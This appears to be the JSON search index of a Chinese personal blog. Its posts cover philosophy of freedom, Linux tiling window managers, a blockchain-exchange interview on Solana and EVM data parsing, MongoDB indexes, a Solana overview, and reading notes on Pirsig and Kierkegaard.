在人处在世界中的每一个时刻，人与世界交互的桥梁就是选择性无视，通过选择性无视人才能分区世界的主次，看见那些你该看见的，听见那些你该听见的，否则，及时你看得见，但是你看见的没有焦点，就像被照在照相机里面的相片一样，只能留给上帝欣赏。 从进化论的角度来说，选择性无视是对危险信号的注视。很多动物都能实现选择性无视，这是感官基础。只是人对选择性无视的运用达到了巅峰造极的地步，以至于人可以集中注意力。（这里说的自由集中注意力与自由意志无关，是人可以自然而然的集中注意力） 选择性遗忘 关于选择性遗忘，我想我不需要解释太多，在国内上过学的人应该都知道《致刘和珍君》,鲁迅口中“遗忘的主啊”所说的就是选择性遗忘，选择性遗忘也不是自由意识的选择，与选择性无视一样，正式因为选择性遗忘，才有记忆这一说法。 我们可以通过选择性无视与选择性遗忘，统一对现在与过去的概念，现在是选择性无视的结果，过去是选择性遗忘的结果 我们了解到人这一躯体的两个不可撼动的法则，接下来我们要开始聊自由意识了 在谈自由意识之前，有两种自由老生常谈的自由 消极自由：消极自由指的是免于干涉的自由。它关注的是外部障碍或强制的缺失。当你拥有消极自由时，意味着没有人或任何机构在不合理地限制你的行动。例如，政府不干涉你的言论、信仰、集会等，你就有言论自由、信仰自由、集会自由。消极自由强调的是“不被做什么”的自由，即个人在不受他人或国家干预的情况下，能够按照自己的意愿行动的领域。 积极自由：积极自由指的是实现自我的自由。它关注的是个人自主性和自我实现的能力。当你拥有积极自由时，意味着你不仅没有外部的阻碍，而且拥有实现自己潜能、掌握自己命运的能力和资源。这可能涉及到获得教育、医疗、经济保障等条件，以便个人能够真正选择和追求他们认为有价值的生活。积极自由强调的是“去做什么”的自由，即个人能够成为自己思想的主人，并能够主动地决定自己的生活方向和目标。","categories":[],"tags":[],"author":"ivhu"},{"title":"平铺窗口合成器杂谈","slug":"平铺窗口合成器杂谈","date":"2025-10-19T02:56:14.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2025/10/19/平铺窗口合成器杂谈/","permalink":"https://bighu630.github.io/2025/10/19/%E5%B9%B3%E9%93%BA%E7%AA%97%E5%8F%A3%E5%90%88%E6%88%90%E5%99%A8%E6%9D%82%E8%B0%88/","excerpt":"","text":"玩linux 有4-5年了，今天来简单梳理一下linux上我用过的一些平铺窗口合成器，也顺便说一下最近新换的一个合成器–niri 跟平铺窗口绑定最多的标签就是 – “效率提升”，“增加屏幕利用率”，我最初可能就是因为这些标签被吸引来的。当然可能还有vim的一部分原因（感觉vimer最终都会转到平铺窗口）。 那些年我用过的非平铺的wm可能很多人然最开始的linux wm是ubunte的gnome.不过我最开始用的是xfce,没错kali的xfce 。 因为大学学的是信息安全专业，so,kali就是我入门的linux, 当时也是莫名其妙的选了xfce（当时也不懂什么wm）。 总之在用kali这一年左右，中间偶尔体验了一下deepin的dde和 ubuntu的gnome.最后感觉用不习惯（gnome是不习惯，dde则是存在一个休眠后无法点亮显示器的bug）。 后面感觉debian系的系统装包有些不方便，同时也是受到一点arch邪教的影响。最终换到arch的子分支 manjaro上，manjaro应该是我用过最长时间的发行版。用manjaro那时候实际上也不懂wm，只是manjaro默认的好像就是kde环境（我碰巧下载的镜像是kde的）。 用了一段时间的kde后. 在B站上看到平铺wm, 当时我已经是vimer了，可以用hjkl切换窗口，让我大受震撼，然后就开始了我的平铺之旅。 这些年我用过的x11平铺wm最开始用平铺，我想试试dwm（很疯狂是把，不会c,去玩dwm），很快我就换到i3了，dwm不是人玩的，改个配置还得重新编译再重启（当时还不知道有注销这个东西，很神奇吧），然后用了快一年左右。当时实习在公司用自己的电脑用的就是i3（说实话最开始用i3 我还不知道i3可以把多个窗口合并到一起，用标签切换）。 我从i3转移到dwm是因为在我上班的某一天，我更新了一下我的manjaro系统，i3打不开了，得亏我系统里面有我正在配置的yaocccc大佬改的dwm,然后临时从i3切换到dwm。 当时yaocccc大佬还更新得很频繁，最开始的时候c佬还没开发出overview功能，用的时候就感觉挺好的，再加上overview功能,简直是梦中情wm，再加上后面开发的最大化窗口功能，说实话直到现在我都感觉dwm是最好的wm,还有很多功我现在都很需要，可惜我后面用的wm的作者没有实现。 近些年我用的wayland平铺wm计划总是赶不上变化，一年后，我毕业了，感觉每次背着我2-3斤的电脑外出太累了，想换个轻薄本。然后我买了个二手的红米本。很遗憾它是一款hidpi的本子，当我装上系统之后我就发现dwm的窗口太小了，而且用xrand调分辨率之后字体会模糊，字体调大的话，我另外一块1080P的显示器字体也会很大。 我被迫从dwm再次换到kde,并且也是用上了wayland.那时差不多是wayland元年（我是这么定的，基本上是从这一年开始wayland达到勉强可用的状态，并且xwayland的bug也没多到不能容忍）。我以为差不多可以止步在kde了，当时kde刚推出plasma6 ，非常大的升级，从qt5升级到qt6 ，我之前用的kde配置基本上都失效了（很神奇，我还保存着几年前kde的配置），然后我整了一套kde plasma6的配置。 起初用plasma6感觉还可以（我也在偶尔折腾dwm的hidpi和其他wm, 大体上的想法是–懒得折腾了），但是后面发现kde有个问题，他的plasma-shell好像有点内存泄漏，我一天不重启plasma-shell的内存就差不到有1G了（好怀念dwm😢）。 然后我毅然决然换到hyprland, 清爽，丝滑，但是很快我发现hyprland没有overview功能，也没有隐藏窗口。当时在github上发现了hycov这款插件可以实现overview功能，刚开始用还好，后面hyprland升级，hycov的作者放弃了支持。 主要还是hyprland此时正处在重大变化的节点（作者非常疯狂的放弃wlroot,并且还有激进的C++版本更新，几乎每个月都会修改核心api）。最开始overview作者弃坑的时候，我尝试接手了一下，修改了少数几个地方，勉强能用，偶尔会有一些小bug。 但是顶不住hyprland激进的更新策略，基本上隔2-3个月我就的在维护一下，差不多摸爬滚打有大半年，在加之hyprland偶尔的不能启动（一般发生在hyprland更新后，有的版本会因为bug启动失败），我决定放弃hyprland了。 我选的替代品是swayfx,sway的优化版, 不过hyprland还是太丝滑了，swayfx和hyprland比还是差很多，所以在最近的几个月，我基本上是在hyprland的sway之间切换着用。 当然sway是wayland上i3的实现，完全兼容i3的配置，hypralnd我也用hy3来模拟一些i3的操作逻辑。 niri为什么要单独起一个标题来说niri呢？ 我感觉niri是一种全新的平铺窗口合成逻辑，无论是x11下的dwm，i3,还是wayland下的hyprland,sway 或者是其他我没有提到的窗口合成器，他们创建窗口的方式都是以屏幕为基础，第一个窗口可能是占满整个屏幕，第二个窗口创建时则会修改第一个窗口的大小，把第一个窗口宽度&#x2F;高度变小一点，然后在生成一个新的窗口（i3系列的可能还有标签这个逻辑），而niri的逻辑则是，把屏幕想象成无限宽的（高度是固定的），物理屏幕是那个无限宽屏幕的一小段，然后可以通过滚动那个无限宽的屏幕，来切换改变物理屏幕显示的窗口,所以niri创建新的窗口时，不会改变原先窗口的大小，而是在这个窗口旁边直接绘制一个窗口，如果物理屏幕放不下，就把转轴往另一个方向移动一点，保证最新的窗口完全显示在物理屏幕上。 由于niri的逻辑屏幕是无限宽的，所以niri的工作区不是左右分布，而是上下分布。对于多显示器来说，niri并不会把两个屏幕连在一起，两个屏幕类似是两个工作区，副屏并不会作为主屏幕的延伸。 同时niri自己也实现了类似overview的功能，不过和上面提到的overview功能不同，niri是看到全局的工作区，在overview里面，你可以看到每个工作区的那个窗口‘卷轴’。 目前来看niri唯一的缺点是还没有实现窗口模糊的功能，对于透明的终端窗口，没有模糊效果。 我用过的窗口合成器排名dwm &gt; niri &gt; hyprland &gt; sway &gt; i3 &gt; kde &gt; xfce &gt; gnome &gt; dde","categories":[],"tags":[],"author":"ivhu"},{"title":"禅与摩托车维修艺术-古典的与艺术的","slug":"禅与摩托车维修艺术-古典的与艺术的","date":"2025-08-15T17:05:08.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2025/08/16/禅与摩托车维修艺术-古典的与艺术的/","permalink":"https://bighu630.github.io/2025/08/16/%E7%A6%85%E4%B8%8E%E6%91%A9%E6%89%98%E8%BD%A6%E7%BB%B4%E4%BF%AE%E8%89%BA%E6%9C%AF-%E5%8F%A4%E5%85%B8%E7%9A%84%E4%B8%8E%E8%89%BA%E6%9C%AF%E7%9A%84/","excerpt":"","text":"25年8月夜，绿皮火车 记 这一次，我们用类似书中的方法来讨论这个博客的内容 – “古典的与浪漫的” 古典的，浪漫的是一种类似“理性&#x2F;感性”的二元论，但较为后者，他们所指的更加明确 当然我们并不想剖析古典与浪漫的二元对立，而是想为作者将此二者糅合的“良质”做注。 我们先从古典的开始入手，古典的类似于，机械式的，教条式的，理论式的（不变的），我们从一个例子入手： 蒙娜丽莎的微笑，她一定是古典的，如果你认为她的微笑是发自‘内心’的，那你就是在用一种浪漫的视角去欣赏她，但是对于一个古典的审美学家来说，他的微笑代表的是他脸部的多少肌肉纤维在收缩，拉扯皮肤，将上下颚调整到合适的位置，最后形成那种自然的微笑。 蒙娜丽莎并不是发自内心的微笑，也不是那种皮笑肉不笑的微笑，她的微笑背后是一系列解剖学理论，她的精美在于是达芬奇对她的每一丝肌肉，与每一寸皮肤，每一根骨骼的把控，她是一副没有灵魂但是有肉体的画。真因为她没有灵魂，她的微笑就只能模仿。 对于浪漫的，没有什么比钢琴曲更适合举例子（当然也有不少’浪漫的‘画），不同于古典的一路绿灯，浪漫的像是猛地一下，所有的绿灯都亮了。一个曲子他不能是古典的（这里并不是说古典风格的音乐），每首音乐都有它自己的开关，音乐创作的过程则是去找到那个点亮所有灯的开关，这个过程往往是灵感迸发，摸到那个开关之后就水到渠成（非常合适的词）。 音乐一但开始古典，就会变得媚俗。蒙娜丽莎一旦开始浪漫，就会变得混乱。 似乎古典的和浪漫的是无法调和的二元对立。但实则这只是房间里的大象。 写不出来了，😭","categories":[],"tags":[],"author":"ivhu"},{"title":"bg一面面经","slug":"bg一面面经","date":"2025-06-30T09:29:18.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2025/06/30/bg一面面经/","permalink":"https://bighu630.github.io/2025/06/30/bg%E4%B8%80%E9%9D%A2%E9%9D%A2%E7%BB%8F/","excerpt":"","text":"某交易所一面面经 自我介绍 交易所项目介绍（详细问） Q：你们的解析项目解析了那些数据？ A：token token_balance nft Account Q：你们的解析全流程是怎么样的？ A：我们上游有一个xx服务，用来从节点那block数据，解析block数据后，将transition数据发到kafka,我们从kafka拿到数据，之后解析 Q：为什么有一个xx服务，你们不直接从节点拿数据？ A：我们还有其他服务需要数据，都从kafka那可以减少对节点的调用次数 Q：先说说solana这一块怎么解析的 A：首先是token, 拿到transition后，解析tx里面的指令，遇到sql token系列合约里面的mintinit系列的指令就判断为token的发行，记录token的数据，token_balance 在tx里面有（postTokenBalance字段），可以直接拿到交易后的账户余额，solana的nft和token的实现是一样的，所以没有单独处理nft. Q：这个过程有没有遇到什么问题？ A：token_balance遇到过postTokenBalance里面缺失数据，后面调研找到缺失的原因是当一个token account关闭时postTokenBalance里面不会记录这条数据，导致余额不一致，解决方案是对比postTokenBalance和preTokenBalance Q：你们有没有解过交易的数据（我回答有解transfer，他反问dex相关的交易）？ A：我没有参与dex这一块的解析，但是有了解过。 Q：怎么解的？ A：一种是解析dex交易，dex交易实际上是dex的指令，根据指令和指令参数就可以知道交易里面包含怎样的swap情况，另外一种是解析dex里面的数据，比如说solana链上有一些通过订单铺实现的dex，链上数据中包含订单铺信息，这时候需要解析dex合约里面的数据账户里面的数据。 Q：那说说evm里面的数据怎么解析？ A：evm我们是从kafka里面订阅的recept（一开始说的是tx,tx里面没有log信息😢），在recept里面查看log信息，判断有没有transfer事件，如果有就通过rpc获取账户相关token的余额。 Q：为什么不像solana那样从数据中解析token余额，要用rpc获取？ A：我们这是一个分布式，多线程的处理方案，处理的数据不是有序的，所以没办法做加减，我们后续有做过一个优化，在一分钟内做加减，但是为了保证数据准确，每分钟会call一下rpc拿到精准的余额信息。 W：这里省略一部分关于业务方使用数据的问题… Q：evm你们除了解token,还有没有解别的（721,1155之类的）？ A：有解析721,和1155 ，具体的解析方式也是根据transfer事件拿到基础信息，再那其他数据。 Q：nft这一块有没有遇到什么问题？ A：我们有一个NFT的项目，他们在链上做了一个非标准的操作，更新了nft的metadata,但是更新操作不是标准721里面的操作，导致我们没有解析到更新之后的nft数据，当时的解决方案是解析捕捉这个非标准操作，并且解析。但是后面调查到有部分项目的玩法就是更新metadata，后面指定的方案是用一个白名单定时刷新这些集合里面的nft。 跨链相关的两个项目 Q：聊一下下面的跨链项目：你们的跨链整体流程是什么样的。 A：大致回答了一下跨链流程（这里不做纤细介绍） Q：这里说到的预编译合约是什么？ A：这个涉及到evm系的合约执行流程，在eth里面，geth收到交易后会丢给evm,evm首先判断call的合约是不是预编译合约，是的话会把参数抛给预编译的go对象，预编译合约可以接受用户的call参数，也能直接修改evm的存储结构（可以直接修改leveldb），预编译的go代码比evm里面的sol代码执行速度快很多，zkevm里面的zk相关合约就是通过预编译合约写的。 Q：假如我要把uniswap v2放到我们自己的evm里面有什么好的解决方案，需要把数据也搞过来？ A：我想他的意思是用预编译的方式放到evm里面（实际上预编译的方式实现会更麻烦），我理解是把uniswap的合约部署过来，然后需要把存储的东西给弄过来，所以回答是 –》 这个涉及到合约的底层结构，每个合约的数据都单独存储在自己的mpt数里面，我们只需要拿到eth上面uniswap的树根，然后便利树根，拿到所有数据之后，把数导入到我们自己的evm里面，但是很难保证我们自己的uniswap可以读取到这个树根，总之这个有可能实现，实现难度一定很大。 反问 Q：我了解到这边是做xxx,我想知道这边有多少个人？ A：n个，这是一个新开的项目 Q：为什么要做xxx, 有很多可以直接用的链上xxx A：1.战略储备，2.链上已有的限制多。 拜拜 一面好像是过了，但是对xx协议解析存在问题，这两天得突击一下。听内推的伙伴说，如果二面的时候问道了xx协议，回答不上可能会挂掉。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"面试","slug":"区块链/面试","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/%E9%9D%A2%E8%AF%95/"}],"tags":[{"name":"交易所","slug":"交易所","permalink":"https://bighu630.github.io/tags/%E4%BA%A4%E6%98%93%E6%89%80/"},{"name":"面经","slug":"面经","permalink":"https://bighu630.github.io/tags/%E9%9D%A2%E7%BB%8F/"}],"author":"ivhu"},{"title":"mongodb索引","slug":"mongodb索引","date":"2025-06-21T09:06:51.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2025/06/21/mongodb索引/","permalink":"https://bighu630.github.io/2025/06/21/mongodb%E7%B4%A2%E5%BC%95/","excerpt":"","text":"mongodb索引索引的作用索引支持在MongoDB中有效地执行查询。如果没有索引，MongoDB必须执行集合扫描，即扫描集合中的每个文档，以选择那些与查询语句匹配的文档。如果一个查询存在适当的索引，MongoDB可以使用该索引来限制它必须检查的文档数量。 索引是特殊的数据结构，它以一种易于遍历的形式存储集合数据集的一小部分。索引存储一个或一组特定字段的值，按字段的值排序。索引项的排序支持有效的相等匹配和基于范围的查询操作。此外，MongoDB可以通过使用索引中的排序返回排序后的结果。 索引默认id索引mongo默认创建的_id索引，_id字段一般用mongo自动生成的id,而不需要插入时手动创造 在分片群集中，如果您不使用**_id字段作为分片键，那么您的应用程序 必须确保_id**字段中值的唯一性以防止错误。这通常是通过使用标准的自动生成的ObjectId来完成的。 索引创建在mongo shell中使用 db.集合.createIndex() 创建索引 以下示例在name字段上创建单个键降序索引： db.collection.createIndex( { name: -1 } ) 索引名称索引的默认名称是索引键和索引中每个键的方向(即1或-1)的连接，使用下划线作为分隔符。例如，在 { item : 1, quantity: -1 }上创建的索引名称为item1_quantity-1 。 可以在创建索引时指定索引名： db.products.createIndex( { item: 1, quantity: -1 } , { name: &quot;query for inventory&quot; } ) [!important] 索引一旦创建，无法修改，包括索引名 索引类型MongoDB提供了许多不同的索引类型来支持特定类型的数据和查询。 单字索引 指在文档中的单个字段上创建索引 对于单字段索引和排序操作，索引键的排序顺序(升序或降序)并不重要，因为MongoDB可以从任何方向遍历索引。 复合索引 指使用多个用户定义字段创建的索引（类似mysql的联合索引），与mysql联合索引类似，必须有序的使用索引。 删除冗余索引 如果集合同时具有复合索引和前缀索引（例如 { a: 1, b: 1 } 和 { a: 1 }），并且两个索引都没有稀疏或唯一约束，则可以删除前缀索引 ({ a: 1 })。MongoDB 在所有需要使用前缀索引的情况下都使用复合索引。 复合索引的排序必须按照索引的顺序和方向，如{ a: 1, b: -1 } 则只能支持一下索引查询 查询a的升序（不查询b） 查询a的升序，b的降序（与索引方法一致）：a的降序，b的升序，需要考虑能否支持 指定a,查询b的降序（注意这里不支持查询b的升序） 多键索引 多键索引是mongo用来索引在数据中的内容的索引。如果索引包含数组值的字段，MongoDB为数组的每个元素创建单独的索引项。这些多键索引允许查询通过匹配数组的一个或多个元素来选择包含数组的文档。MongoDB自动决定是否创建一个多键索引，如果索引字段包含数组值;您不需要显式地指定多键类型。 地址空间索引 Mongo支持的一种特殊索引，支持对使用平面几何的2d索引和使用球面几何返回结果的2dsphere索引。 文本索引 https://chatgpt.com/s/t_685656f2a2608191ab47d328a77e736f hashed索引 指对key的内容hash之后做索引，hash索引只支持等值匹配，不支持范围查询，常用于作为分片键。 索引属性 唯一索引 唯一索引用于规划这个key对应的值在集合（table）中只能出现一次，一个集合里面可以有多个唯一索引，唯一索引对应的key如果不存在则不进行索引，只保证存在的文档中对应key不重复。 部分索引 部分索引仅索引集合中符合指定过滤器表达式的文档。通过对集合中的部分文档建立索引，部分索引可以降低存储需求，并降低创建和维护索引的性能成本。 部分索引提供了稀疏索引功能的超集，因此应优先于稀疏索引。 https://chatgpt.com/s/t_6856588847ac819183546a5583026345 稀疏索引 索引的稀疏属性可确保索引仅包含具有索引字段的文档的条目。索引会跳过没有索引字段的文档。 TTL索引 自动过期索引 索引查询 覆盖查询 类似mysql的覆盖索引，如果索引字段包含查询字段，则可以直接返回索引的数据，而不用回表查询。 https://chatgpt.com/s/t_68565a662a208191a66a97fac05ed587 索引交集 MongoDB可以使用索引的交集来完成查询。对于指定复合查询条件的查询，如果一个索引可以满足查询条件的一部分，而另一个索引可以满足查询条件的另一部分，则MongoDB可以使用两个索引的交集来满足查询。使用复合索引还是使用索引交集是否更有效取决于特定查询和系统。","categories":[],"tags":[],"author":"ivhu"},{"title":"solana杂谈（1）","slug":"solana杂谈（1）","date":"2025-06-17T08:19:51.000Z","updated":"2026-02-27T03:14:28.899Z","comments":true,"path":"2025/06/17/solana杂谈（1）/","permalink":"https://bighu630.github.io/2025/06/17/solana%E6%9D%82%E8%B0%88%EF%BC%881%EF%BC%89/","excerpt":"","text":"solana杂谈（1） 本文适用于“只需大致了解 Solana”的读者，部分说法可能不够准确或不够深入。如需详细了解，建议阅读 Solana 的官方文档：https://solana.com/zh/docs solana账户模型solana 上所有数据都是储存在账户中，也就是说你可以通过账户信息拿到链上的任意状态（将区块链理解为一个大型状态机）.solana 账户结构如下： 钱包账户（Wallet Account）：data 字段为空。这类账户由椭圆曲线生成的公私钥对管理，拥有私钥的用户可以通过签署并发送交易来修改链上状态。 程序账户（Program Account）：data 字段包含 Solana 程序的指令集及其 WASM 二进制代码。 数据账户（Data Account）：data 字段包含所有编码后的数据。 在 Solana 中，程序账户和数据账户的地址通常是通过特殊方式生成的，并非由椭圆曲线公私钥对直接控制，因此无法直接通过私钥生成签名。它们的状态修改通常通过**程序派生地址（Program Derived Address, PDA）**代理签名，在状态机内部进行。 账户租金账户租金是solana避免数据臃余的处理方案（evm是通过释放空间，返回eth的方式），对于solana上所有的用户都需要支付租金（或者余额大于一定值免租）. 钱包账户：租金由账户所有者自己支付。 程序账户：租金通常由程序的创建者一次性支付，以确保程序的可持续运行。 租金豁免：如果账户中存储的 SOL 数量足以支付该账户两年期的租金，则该账户可以获得租金豁免，无需再支付租金。这意味着账户将永久存在，除非被关闭。 数据账户（Data Account）：通常是程序用于保存数据的账户，其租金由创建该数据账户的交易发起者支付。 数据账户管理：对于核心项目数据，通常在程序部署时进行统一初始化，以防止意外删除。对于用户自行管理的数据账户（如链上的 Token 账户），则由用户自己创建并管理租金。 rent_epoch：这是一个遗留字段，源于 Solana 曾经有一个机制会定期从账户中扣除 lamports。虽然此字段仍然存在于账户类型中，但自从租金收取被弃用后，它已不再使用。😅 租金已经被弃用了 solana的token标准solana上的token不像evm有多种token执行标准（erc20&#x2F;erc721&#x2F;erc1155）,也不会每个token都上去部署一个合约。 solana上的token由token program统一管理（token progeam有两个版本，这里不做展开），接下来我们从token的生命周期来看一下solana的脱可能标准 项目方创建token项目方创建token实际上是向token program发送一个mintinit指令，在token program中登记一个token 以及记录怎么发行token不同于evm，不是一个合约，由合约管理token mint token在token初始化时制定了mint权限，拥有mint权限的账户合约mint token，注意每一个token有他独立的mint account.mint account的权限 创建token account钱包用户通过token program，创建对应token 的token account(实际上也是一个数据账户)，用于保存钱包用户的token的状态 token transfertoken transfer指令由钱包用户发起，由token program执行，修改发送方&#x2F;接收方的token account 里面的余额状态，实现token的转账 另外还有销毁和授权，这里不做展开 在solana上发行token不需要额外的部署代码 对于nft类的token,solana并不严格区分token类型，nft和ft共享相同的指令集（指令里面也没有区分这两者） solana上的nftsolana nft转账之类的操作在token program上实现，生命周期通常由类似 Metaplex这类token标准管理（这些token是社区推动的标准，不同于token program预编译在solana主链上） Metaplex这类标准通过控制token program mint不同的token来实现nft,也就是对于每一个nft的生成，实际上是在token program上执行 mintinit操作（！！！ 不是mint操作），每一个nft的mint相当于是发行一个token，Metaplex程序控制发行量，从而实现nft solana合约标准solana使用的BPF vm执行合约 合约生命周期有BPF loader系列系统合约管理.通常情况下需要将合约编码成wasm的二进制码然后部署在solana链上 对于合约开发，合约需要与solana链交互，所以并不是所有语言都可以开发solana合约，需要对应语言实现solana program sdk 并且可以编译成wasm的二进制码目前来看只有（rust&#x2F;c&#x2F;c++）其他语言有一些社区实现的sdk,可能存在问题 solana的共识Solana 采用的是一种混合共识机制，结合了以下几个关键技术： Proof of History (PoH) — 历史证明 这是 Solana 最核心的创新点。 PoH 通过一个加密哈希函数（SHA-256）以连续的方式产生可验证的时间顺序证明，相当于给所有交易和事件打上了时间戳。 这个机制让网络无需等待区块时间戳验证，极大地提高了交易处理速度和吞吐量。 Tower BFT — 基于 PoH 的拜占庭容错共识 Tower BFT 是 Solana 的一种优化的 Practical Byzantine Fault Tolerance (PBFT) 机制。 利用 PoH 生成的全局时间顺序，节点可以在这个时间线上锁定状态，从而更高效地达成共识。 节点通过投票和锁定投票权重防止双重花费和恶意行为。 Turbine — 高效的数据传播协议 用于快速分发数据包，减少网络拥堵，提高广播效率。 Gulf Stream — 交易转发协议 允许交易在网络中提前转发给验证者，减少确认时间。 Sealevel — 并行智能合约运行时 允许同时处理多个交易，提高吞吐量。 Solana 共识流程简要 交易发起后，节点利用 PoH 来验证交易的时间顺序。 验证者节点基于 Tower BFT 达成共识，投票决定哪个区块被接受。 通过这种方式，Solana 可以实现每秒数千至数万笔交易的处理速度。","categories":[{"name":"区块链","slug":"区块链","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/"},{"name":"solana","slug":"区块链/solana","permalink":"https://bighu630.github.io/categories/%E5%8C%BA%E5%9D%97%E9%93%BE/solana/"}],"tags":[{"name":"solana","slug":"solana","permalink":"https://bighu630.github.io/tags/solana/"}],"author":"ivhu"},{"title":"禅与摩托车维修艺术-1","slug":"禅与摩托车维修艺术（1）","date":"2025-04-15T01:04:46.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2025/04/15/禅与摩托车维修艺术（1）/","permalink":"https://bighu630.github.io/2025/04/15/%E7%A6%85%E4%B8%8E%E6%91%A9%E6%89%98%E8%BD%A6%E7%BB%B4%E4%BF%AE%E8%89%BA%E6%9C%AF%EF%BC%881%EF%BC%89/","excerpt":"","text":"这算得上我第四次看这本书，看这么多次主要是一直没怎么看懂。在细说这本书之前，先简单聊一下这个作者的背景故事（在我的视角下）。本书作者原本是一个严重的精神分裂患者，后来在精神病院中，作者的另外一个人格在高压电下意识死亡，从而回归一个人格的视角，故事写于作者在精神病院出来后和自己的儿子以及两个朋友的绕美摩托车旅行（这两是夫妻）。在旅行期间通过 陶野扩 的方式和旅人讲述长久以来的心物二元论，同时引出“良质”来解决心物二元论的冲突（当然大部分是作者独自思考，毕竟和他一起旅游主要是想旅游，而不是像思考）1、两种人技术理性派，与非技术理想派（非原文观点）。这源于一个很有意思的问题–“一个人应当多大程度上独立维修自己的摩托车？” 作者属于是技术理性派，他会大量的维修手段，当然关键是他可以通过听发动机的声音判断发动机的状态。与之相对的是他的两个朋友，几乎不会自己动手去修理摩托车（摩托车送的维修配件包甚至是新的），他们选择购买昂贵的摩托车的方式规避开到半路上摩托车出问题的风险（这显然行不通），所以在没有作者的摩托车旅途中，他们只能选择附近有维修站的线路。就背景而言，随着工业的发展，越来越多的技术部件进入人的生活（比如那对夫妻家中的水龙头，他们通过无视来规避漏水的滴滴答答），对于一些人而言，那些器具上面铭刻着醒目的“禁止触碰，仅开关可碰”。另一方面，这种隔阂像是一篇工业废墟，破烂的铁丝网上挂着禁止入内的蓝色牌子，在有的人看来就像是“欢迎光临”.2、心物二元论关于鬼真的存在吗的讨论，这也是本书很经典的片段。起因是作者的儿子（克里斯）想要听鬼故事，他的一个印地安同学说鬼真的存在，而且那个同学还见过。克里斯还属于那种相信“鬼只存在人的脑海中”的理论（即使现在大部分人也会如此），作者并不否认鬼在脑海中，但是他澄清了一个误区,也就是鬼在脑海中，所以鬼不存在。而后开启一段“诡异”的陶冶扩–万有引力被发现之前，存在万有引力吗？似乎答案是显然存在的。但是他如何存在，他的存在是苹果掉到地面上，而不是掉到天上去了。但是他在什么地方，万有引力使苹果掉到大地上，但事实上是苹果和大地使苹果掉在大地上，而万有引力则是牛顿创造出来的鬼魂，他把苹果“掉”到地上。 小结：看上去还差点火候，似乎没法把作者想要表达的关键写出来，特别是鬼故事那一段。先到这儿了，后面我也没看多少（这一次又要不定期脱更了😭）","categories":[{"name":"图书","slug":"图书","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/"},{"name":"禅与摩托维修艺术","slug":"图书/禅与摩托维修艺术","permalink":"https://bighu630.github.io/categories/%E5%9B%BE%E4%B9%A6/%E7%A6%85%E4%B8%8E%E6%91%A9%E6%89%98%E7%BB%B4%E4%BF%AE%E8%89%BA%E6%9C%AF/"}],"tags":[{"name":"二元论","slug":"二元论","permalink":"https://bighu630.github.io/tags/%E4%BA%8C%E5%85%83%E8%AE%BA/"}],"author":"ivhu"},{"title":"恐惧与颤栗-1","slug":"恐惧与颤栗（1）","date":"2025-03-12T12:29:15.000Z","updated":"2026-02-27T03:14:28.901Z","comments":true,"path":"2025/03/12/恐惧与颤栗（1）/","permalink":"https://bighu630.github.io/2025/03/12/%E6%81%90%E6%83%A7%E4%B8%8E%E9%A2%A4%E6%A0%97%EF%BC%881%EF%BC%89/","excerpt":"","text":"心境 克尔恺郭尔 - 恐惧与颤栗一书第一章 – 心境 “神要试验亚伯拉罕，就对他说，带着以撒，你独生的儿子，你所爱的，往摩利亚地去，在我所要指示你的山上，把他献为燔祭。” 这是梦开始的地方，乍一听这是一个疯狂且愚蠢的故事，怎么会有人愚蠢到相信脑子的（幻听），献祭自己的儿子。 但是亚伯拉罕不是一个疯子，在那个时代，他是被敬仰的人。 可能有人会认为那是那个时代的问题，我不否定这种想法，但是我不认为存在一个没有问题的时代，那个时代的人之所以会有那样的观念，恰恰是因为他们在那个时代，就像你在这个时代一样。我不会举例子去解释这段话，因为这恰是 “我在哪儿？”这个问题的一部分的答案，我处在我正在这里的时代，同时我不再其他我不再的时代，那么关于亚伯拉罕所在时代，敬仰他是应该的，如同现在的鄙夷也是应该的。 心境这一章是克尔恺郭尔信仰之旅的起点，也是从亚伯拉罕这里把握信仰的关键。 上帝让亚伯拉罕去献祭自己的儿子，那么亚伯拉罕会怎么想。 这个人不是一个思想家，他没有想要出离信仰的愿望；在他看来，“像信仰之父一样地被记住” 必定就是最为荣耀的事情，“拥有信仰”是一种令人羡慕的命运，哪怕没有人知道他拥有这信仰。 这个人不是博学的圣经注释家，他不会希伯来语；如果他会希伯来语的话，那么，他也许就很容易地理解了这故事和亚伯拉罕。 四个小故事1 那是一个清晨，亚伯拉罕清早起来，给毛驴戴上鞍座，离开自己的帐篷，以撒跟着他 ，但是撒拉从窗户里望出去目送他们向下走过谷地 ，直到她无法再看得见他们。他们沉默地骑着驴旅行了三天，在第四天的早晨，亚伯拉罕一声不吭，但抬眼看着远方的摩利亚山。他让那些男孩子们留在下面而独自拉着以撒的手走上山。但是亚伯拉罕对自己说：“我倒是不会对以撒隐瞒这段路将会把他带往何方。”他沉默地站着，他把自己的手放在以撒的头上作为祝福，以撒躬身接受这祝福。亚伯拉罕的脸是父慈之容，他的目光是温柔的，他的话语是谆谆的训诫。但是以撒无法明白他，他的灵魂无法进入崇高；他抱着亚伯拉罕的膝盖 ，他在他的脚前祈求，他为自己年轻的生命而祈求，为自己美丽的生命蓝图而祈求，他回想起亚伯拉罕家中的喜悦，他回想起悲伤和孤独。这时，亚伯拉罕拉起这孩子，并和他并排走着，他的话语中满是安慰和训诫。但是以撒无法明白他。他登上摩利亚山，但是以撒不明白他。这时，他把自己的目光从他身上移开一小瞬间，但是在以撒再次看到亚伯拉罕的脸时，所看见的就变掉了，他的目光是狂野的，他的形象是恐怖。他抓住以撒的胸，把他扔在地上，并且说：“愚蠢的孩子，你以为我是你父亲？我是一个偶像崇拜者。你以为这是上帝的命令吗？不，这是我自己想要做的事情。”于是以撒颤抖着，在自己的恐惧中喊着：“天上的主啊，请给我慈悲，亚伯拉罕的神啊，请给我慈悲，既然我在大地上没有父亲，那么你就是我的父亲！”但是亚伯拉罕低声自语：“天上的主啊，我感谢你；他以为我是一个非人，但这还是好过他丧失对你的信仰。” ****** 